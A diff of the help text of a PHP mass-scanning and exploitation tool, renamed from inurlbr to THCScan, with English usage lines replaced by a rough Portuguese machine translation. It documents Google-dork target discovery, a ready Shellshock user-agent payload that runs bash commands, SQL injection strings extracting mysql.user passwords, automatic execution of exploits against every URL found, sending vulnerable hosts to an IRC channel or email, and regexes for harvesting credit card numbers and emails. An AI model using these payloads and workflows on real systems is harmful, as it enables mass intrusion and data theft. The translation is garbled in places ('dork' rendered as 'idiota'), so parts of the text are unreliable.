-     Example: {$_SESSION["c1"]}-s {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-s {$_SESSION["c2"]}your_file.txt
+     Exemplo: {$_SESSION["c1"]}-s {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}-s {$_SESSION["c2"]}Seu_Arquivo.txt
      
- {$_SESSION["c1"]}-o{$_SESSION["c0"]}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
-     Example: {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file_where_my_urls_are}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-o {$_SESSION["c2"]}tests.txt
+ {$_SESSION["c1"]}-o{$_SESSION["c0"]}  Gerenciar manualmente os URLs vulneráveis que você deseja usar de um arquivo, sem usar um mecanismo de pesquisa. 
+     Exemplo: {$_SESSION["c1"]}-o {$_SESSION["c2"]}{arquivo_onde_meus_URLs}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}-o {$_SESSION["c2"]}test.txt
    
- {$_SESSION["c1"]}--persist{$_SESSION["c0"]}  Attempts when Google blocks your search.
-     The script tries to another google host / default = 4
-     Example: {$_SESSION["c1"]}--persist {$_SESSION["c2"]}{number_attempts}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--persist {$_SESSION["c2"]}7
+ {$_SESSION["c1"]}--persist{$_SESSION["c0"]}  Tentativas quando o Google bloqueia sua pesquisa.
+      O script tenta outro host / padrão do Google = 4
+     Exemplo: {$_SESSION["c1"]}--persist {$_SESSION["c2"]}{number_attempts}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--persist {$_SESSION["c2"]}7
 
- {$_SESSION["c1"]}--ifredirect{$_SESSION["c0"]}  Return validation method post REDIRECT_URL
-     Example: {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}{string_validation}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}'/admin/painel.php'
+ {$_SESSION["c1"]}--ifredirect{$_SESSION["c0"]} Retornar o post do método de validação REDIRECT_URL
+     Exemplo: {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}{string_validation}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}'/admin/painel.php'
 
- {$_SESSION["c1"]}-m{$_SESSION["c0"]}  Enable the search for emails on the urls specified.
+ {$_SESSION["c1"]}-m{$_SESSION["c0"]}  Ative a pesquisa por emails nos URLs especificados.
   
- {$_SESSION["c1"]}-u{$_SESSION["c0"]}  Enables the search for URL lists on the url specified.
+ {$_SESSION["c1"]}-u{$_SESSION["c0"]}  Permite a pesquisa de listas de URLs no URL especificado.
  
- {$_SESSION["c1"]}--gc{$_SESSION["c0"]} Enable validation of values ​​with google webcache.
+ {$_SESSION["c1"]}--gc{$_SESSION["c0"]} Ative a validação de valores com o google webcache.
      
- {$_SESSION["c1"]}--pr{$_SESSION["c0"]}  Progressive scan, used to set operators (dorks), 
-     makes the search of a dork and valid results, then goes a dork at a time.
+ {$_SESSION["c1"]}--pr{$_SESSION["c0"]}  Varredura progressiva, usada para definir operadores (dorks),
+      faz a busca de um idiota e resultados válidos, então vai um idiota de cada vez.
   
- {$_SESSION["c1"]}--file-cookie{$_SESSION["c0"]} Open cookie file.
+ {$_SESSION["c1"]}--file-cookie{$_SESSION["c0"]}Abra o arquivo de cookie.
      
- {$_SESSION["c1"]}--save-as{$_SESSION["c0"]} Save results in a certain place.
+ {$_SESSION["c1"]}--save-as{$_SESSION["c0"]} Salve os resultados em um determinado lugar.
 
- {$_SESSION["c1"]}--shellshock{$_SESSION["c0"]} Explore shellshock vulnerability by setting a malicious user-agent.
+ {$_SESSION["c1"]}--shellshock{$_SESSION["c0"]} Explore a vulnerabilidade do shellshock definindo um user agent malicioso.
  
- {$_SESSION["c1"]}--popup{$_SESSION["c0"]} Run --command all or vuln in a parallel terminal.
+ {$_SESSION["c1"]}--popup{$_SESSION["c0"]} Executar --command all ou vuln em um terminal paralelo.
 
- {$_SESSION["c1"]}--cms-check{$_SESSION["c0"]} Enable simple check if the url / target is using CMS.
+ {$_SESSION["c1"]}--cms-check{$_SESSION["c0"]} Ative a verificação simples se o URL / destino estiver usando o CMS.
 
- {$_SESSION["c1"]}--no-banner{$_SESSION["c0"]} Remove the script presentation banner.
+ {$_SESSION["c1"]}--no-banner{$_SESSION["c0"]}Remova o banner de apresentação do script.
      
- {$_SESSION["c1"]}--unique{$_SESSION["c0"]} Filter results in unique domains.
+ {$_SESSION["c1"]}--unique{$_SESSION["c0"]} Filtrar resultados em domínios exclusivos.
 
- {$_SESSION["c1"]}--beep{$_SESSION["c0"]} Beep sound when a vulnerability is found.
+ {$_SESSION["c1"]}--beep{$_SESSION["c0"]} Bipe som quando uma vulnerabilidade é encontrada.
      
- {$_SESSION["c1"]}--alexa-rank{$_SESSION["c0"]} Show alexa positioning in the results.
+ {$_SESSION["c1"]}--alexa-rank{$_SESSION["c0"]} Mostrar o posicionamento de alexa nos resultados.
      
- {$_SESSION["c1"]}--robots{$_SESSION["c0"]} Show values file robots.
+ {$_SESSION["c1"]}--robots{$_SESSION["c0"]} Mostrar robôs de arquivo de valores.
       
- {$_SESSION["c1"]}--range{$_SESSION["c0"]} Set range IP.
-      Example: {$_SESSION["c1"]}--range {$_SESSION["c2"]}{range_start,rage_end}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--range {$_SESSION["c2"]}'172.16.0.5#172.16.0.255'
+ {$_SESSION["c1"]}--range{$_SESSION["c0"]} Definir intervalo IP.
+      Exemplo: {$_SESSION["c1"]}--range {$_SESSION["c2"]}{range_start,rage_end}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--range {$_SESSION["c2"]}'172.16.0.5#172.16.0.255'
 
- {$_SESSION["c1"]}--range-rand{$_SESSION["c0"]} Set amount of random ips.
-      Example: {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}{rand}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}'50'
+ {$_SESSION["c1"]}--range-rand{$_SESSION["c0"]} Definir quantidade de ips aleatórios.
+      Exemplo: {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}{rand}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}'50'
 
- {$_SESSION["c1"]}--irc{$_SESSION["c0"]} Sending vulnerable to IRC / server channel.
-      Example: {$_SESSION["c1"]}--irc {$_SESSION["c2"]}{server#channel}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'
+ {$_SESSION["c1"]}--irc{$_SESSION["c0"]} Envio vulnerável ao canal IRC / servidor.
+      Exemplo: {$_SESSION["c1"]}--irc {$_SESSION["c2"]}{server#channel}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#THCScan'
 
- {$_SESSION["c1"]}--http-header{$_SESSION["c0"]} Set HTTP header.
-      Example: {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
+ {$_SESSION["c1"]}--http-header{$_SESSION["c0"]} Definir cabeçalho HTTP.
+      Exemplo: {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
           
- {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Sending vulnerable to email.
-      Example: {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}youemail@inurl.com.br
+ {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Envio vulnerável a email.
+      Exemplo: {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}youemail@inurl.com.br
           
- {$_SESSION["c1"]}--delay{$_SESSION["c0"]} Delay between research processes.
-      Example: {$_SESSION["c1"]}--delay {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--delay {$_SESSION["c2"]}10
+ {$_SESSION["c1"]}--delay{$_SESSION["c0"]} Atraso entre processos de pesquisa.
+      Exemplo: {$_SESSION["c1"]}--delay {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--delay {$_SESSION["c2"]}10
   
- {$_SESSION["c1"]}--time-out{$_SESSION["c0"]} Timeout to exit the process.
-      Example: {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}10
+ {$_SESSION["c1"]}--time-out{$_SESSION["c0"]} Tempo limite para sair do processo.
+      Exemplo: {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}10
 
- {$_SESSION["c1"]}--ifurl{$_SESSION["c0"]} Filter URLs based on their argument.
-      Example: {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}{ifurl}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}index.php?id=
+ {$_SESSION["c1"]}--ifurl{$_SESSION["c0"]} Filtrar URLs com base em seu argumento.
+      Exemplo: {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}{ifurl}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}index.php?id=
 
- {$_SESSION["c1"]}--ifcode{$_SESSION["c0"]} Valid results based on your return http code.
-      Example: {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}{ifcode}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}200
+ {$_SESSION["c1"]}--ifcode{$_SESSION["c0"]} Resultados válidos com base no seu código http de retorno.
+      Exemplo: {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}{ifcode}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}200
  
- {$_SESSION["c1"]}--ifemail{$_SESSION["c0"]} Filter E-mails based on their argument.
-     Example: {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}{file_where_my_emails_are}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}sp.gov.br
+ {$_SESSION["c1"]}--ifemail{$_SESSION["c0"]} Filtrar e-mails com base em seu argumento.
+     Exemplo: {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}{file_where_my_emails_are}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}sp.gov.br
 
- {$_SESSION["c1"]}--url-reference{$_SESSION["c0"]} Define referring URL in the request to send him against the target.
-      Example: {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}{url}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}http://target.com/admin/user/valid.php
+ {$_SESSION["c1"]}--url-reference{$_SESSION["c0"]} Defina o URL de referência na solicitação para enviá-lo contra o destino.
+      Exemplo: {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}{url}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}http://target.com/admin/user/valid.php
  
- {$_SESSION["c1"]}--mp{$_SESSION["c0"]} Limits the number of pages in the search engines.
-     Example: {$_SESSION["c1"]}--mp {$_SESSION["c2"]}{limit}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--mp {$_SESSION["c2"]}50
+ {$_SESSION["c1"]}--mp{$_SESSION["c0"]} Limita o número de páginas nos mecanismos de pesquisa.
+     Exemplo: {$_SESSION["c1"]}--mp {$_SESSION["c2"]}{limit}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--mp {$_SESSION["c2"]}50
      
- {$_SESSION["c1"]}--user-agent{$_SESSION["c0"]} Define the user agent used in its request against the target.
-      Example: {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}{agent}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
+ {$_SESSION["c1"]}--user-agent{$_SESSION["c0"]} Defina o agente do usuário usado em sua solicitação no destino.
+      Exemplo: {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}{agent}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
       Usage-exploit / SHELLSHOCK:   
       {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
       Complete command:    
-      php inurlbr.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
+      php THCScan.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
  
- {$_SESSION["c1"]}--sall{$_SESSION["c0"]} Saves all urls found by the scanner.
-     Example: {$_SESSION["c1"]}--sall {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sall {$_SESSION["c2"]}your_file.txt
+ {$_SESSION["c1"]}--sall{$_SESSION["c0"]} Salva todos os URLs encontrados pelo scanner.
+     Exemplo: {$_SESSION["c1"]}--sall {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--sall {$_SESSION["c2"]}your_file.txt
 
- {$_SESSION["c1"]}--command-vul{$_SESSION["c0"]} Every vulnerable URL found will execute this command parameters.
-     Example: {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--command-vul{$_SESSION["c0"]} Cada URL vulnerável encontrada executará esses parâmetros de comando.
+     Exemplo: {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                   
- {$_SESSION["c1"]}--command-all{$_SESSION["c0"]} Use this commmand to specify a single command to EVERY URL found.
-     Example: {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--command-all{$_SESSION["c0"]} Use este comando para especificar um único comando para CADA URL encontrado.
+     Exemplo: {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
-    [!] Observation:
+    [!] Observaçao:
    
-    {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} will be replaced by the URL/target found, although if the user  
-    doesn't input the get, only the domain will be executed.
+    {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} será substituído pelo URL / destino encontrado, embora se o usuário
+     não insere o get, apenas o domínio será executado.
    
-    {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} will be replaced by the original URL / target found.
+    {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} será substituído pelo URL / destino original encontrado.
        
-    {$_SESSION["c14"]}_TARGETXPL_{$_SESSION["c0"]} will be replaced by the original URL / target found + EXPLOIT --exploit-get.
+    {$_SESSION["c14"]}_TARGETXPL_{$_SESSION["c0"]} será substituído pelo URL / destino original encontrado + EXPLOIT --exploit-get.
        
-    {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} return of ip URL / target found.
+    {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} retorno do URL / destino do ip encontrado.
         
-    {$_SESSION["c8"]}_URI_{$_SESSION["c0"]} Back URL set of folders / target found.
+    {$_SESSION["c8"]}_URI_{$_SESSION["c0"]} Voltar URL conjunto de pastas / destino encontrados.
         
-    {$_SESSION["c15"]}_RANDOM_{$_SESSION["c0"]} Random strings.
+    {$_SESSION["c15"]}_RANDOM_{$_SESSION["c0"]} Seqüências aleatórias.
         
-    {$_SESSION["c9"]}_PORT_{$_SESSION["c0"]} Capture port of the current test, within the --port-scan process.
+    {$_SESSION["c9"]}_PORT_{$_SESSION["c0"]} Capture a porta do teste atual, dentro do processo --port-scan.
    
-    {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  will be replaced by the specified command argument {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
-   The exploit-command will be identified by the parameters {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}
+    {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  será substituído pelo argumento do comando especificado {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
+   O exploit-command será identificado pelos parâmetros {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}
 
- {$_SESSION["c1"]}--replace{$_SESSION["c0"]} Replace values ​​in the target URL.
-    Example:  {$_SESSION["c1"]}--replace {$_SESSION["c2"]}{value_old[INURL]value_new}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--replace{$_SESSION["c0"]} Substitua os valores no URL de destino.
+    Exemplo:  {$_SESSION["c1"]}--replace {$_SESSION["c2"]}{value_old[INURL]value_new}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$_SESSION["c0"]}
               {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$_SESSION["c0"]}
                   
- {$_SESSION["c1"]}--remove{$_SESSION["c0"]} Remove values ​​in the target URL.
-      Example: {$_SESSION["c1"]}--remove {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--remove {$_SESSION["c2"]}'/admin.php?id=0'
+ {$_SESSION["c1"]}--remove{$_SESSION["c0"]} Remover valores no URL de destino.
+      Exemplo: {$_SESSION["c1"]}--remove {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
+      Uso:   {$_SESSION["c1"]}--remove {$_SESSION["c2"]}'/admin.php?id=0'
               
- {$_SESSION["c1"]}--regexp{$_SESSION["c0"]} Using regular expression to validate his research, the value of the 
-    Expression will be sought within the target/URL.
-    Example:  {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
-    All Major Credit Cards:
-    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--regexp{$_SESSION["c0"]}Usando expressão regular para validar sua pesquisa, o valor do
+     A expressão será procurada no destino / URL.
+    Exemplo:  {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
+    Todos os principais cartões de crédito:
+    Uso:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$_SESSION["c0"]}
     
     IP Addresses:
-    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$_SESSION["c0"]}
+    Uso:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$_SESSION["c0"]}
     
     EMAIL:   
-    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
+    Uso:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
     
 
- {$_SESSION["c1"]}---regexp-filter{$_SESSION["c0"]} Using regular expression to filter his research, the value of the 
-     Expression will be sought within the target/URL.
-    Example:  {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
+ {$_SESSION["c1"]}---regexp-filter{$_SESSION["c0"]} Usando expressões regulares para filtrar sua pesquisa, o valor do
+      A expressão será procurada no destino / URL.
+    Exemplo:  {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
     EMAIL:   
-    Usage:    {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
+    Uso:    {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
  
 
-    [!] Small commands manager:
+    [!] Gerenciador de pequenos comandos:
     
- {$_SESSION["c1"]}--exploit-cad{$_SESSION["c0"]} Command register for use within the scanner.
+ {$_SESSION["c1"]}--exploit-cad{$_SESSION["c0"]} Registro de comandos para uso dentro do scanner.
     Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
-    Example Format: NMAP::nmap -sV _TARGET_
-    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
-    Usage:    {$_SESSION["c1"]}--exploit-cad{$_SESSION["c2"]} 'NMAP::nmap -sV _TARGET_'{$_SESSION["c0"]} 
-    Observation: Each registered command is identified by an id of your array.
-                 Commands are logged in exploits.conf file.
+    Exemplo de Format: NMAP::nmap -sV _TARGET_
+    Exemplo de Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
+    Uso:    {$_SESSION["c1"]}--exploit-cad{$_SESSION["c2"]} 'NMAP::nmap -sV _TARGET_'{$_SESSION["c0"]} 
+    Observaçao: Cada comando registrado é identificado por um id de sua matriz.
+                  Comandos são registrados no arquivo exploits.conf.
 
- {$_SESSION["c1"]}--exploit-all-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
-    (all) is run for each target found by the engine.
-     Example: {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}1,2,8,22
+ {$_SESSION["c1"]}--exploit-all-id{$_SESSION["c0"]} Executar comandos, exploits baseados no id de uso,
+     (tudo) é executado para cada destino encontrado pelo mecanismo.
+     Exemplo: {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}1,2,8,22
          
- {$_SESSION["c1"]}--exploit-vul-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
-    (vull) run command only if the target was considered vulnerable.
-     Example: {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}1,2,8,22
+ {$_SESSION["c1"]}--exploit-vul-id{$_SESSION["c0"]} Executar comandos, exploits baseados no id de uso,
+     (vull) executa o comando somente se o alvo foi considerado vulnerável.
+     Exemplo: {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}1,2,8,22
 
- {$_SESSION["c1"]}--exploit-list{$_SESSION["c0"]} List all entries command in exploits.conf file.
+ {$_SESSION["c1"]}--exploit-list{$_SESSION["c0"]} Listar todas as entradas no arquivo exploits.conf.
 
 
-    [!] Running subprocesses:
+    [!] Executando subprocessos:
     
- {$_SESSION["c1"]}--sub-file{$_SESSION["c0"]}  Subprocess performs an injection 
-     strings in URLs found by the engine, via GET or POST.
-     Example: {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}{youfile}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}exploits_get.txt
+ {$_SESSION["c1"]}--sub-file{$_SESSION["c0"]}  Subprocesso executa uma injeção
+      strings em URLs encontradas pelo mecanismo, por meio de GET ou POST.
+     Exemplo: {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}{youfile}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}exploits_get.txt
          
- {$_SESSION["c1"]}--sub-get{$_SESSION["c0"]} defines whether the strings coming from 
-     --sub-file will be injected via GET.
-     Usage:   {$_SESSION["c1"]}--sub-get
+ {$_SESSION["c1"]}--sub-get{$_SESSION["c0"]} define se as strings vindas de
+      --sub-file será injetado via GET.
+     Uso:   {$_SESSION["c1"]}--sub-get
          
- {$_SESSION["c1"]}--sub-post{$_SESSION["c0"]} defines whether the strings coming from 
-     --sub-file will be injected via POST.
-     Usage:   {$_SESSION["c1"]}--sub-get
+ {$_SESSION["c1"]}--sub-post{$_SESSION["c0"]} define se as strings vindas de
+      --sub-file será injetado via POST.
+     Uso:   {$_SESSION["c1"]}--sub-get
          
- {$_SESSION["c1"]}--sub-concat{$_SESSION["c0"]} Sets string to be concatenated with 
-     the target host within the subprocess
-     Example: {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}'/login.php'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--sub-concat{$_SESSION["c0"]} Define a string a ser concatenada com
+      o host de destino dentro do subprocesso
+     Exemplo: {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
+     Uso:   {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}'/login.php'{$_SESSION["c0"]}
 
- {$_SESSION["c1"]}--sub-cmd-vul{$_SESSION["c0"]} Each vulnerable URL found within the sub-process
-     will execute the parameters of this command.
-     Example: {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--sub-cmd-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
+ {$_SESSION["c1"]}--sub-cmd-vul{$_SESSION["c0"]} Cada URL vulnerável encontrado no subprocesso
+      irá executar os parâmetros deste comando.
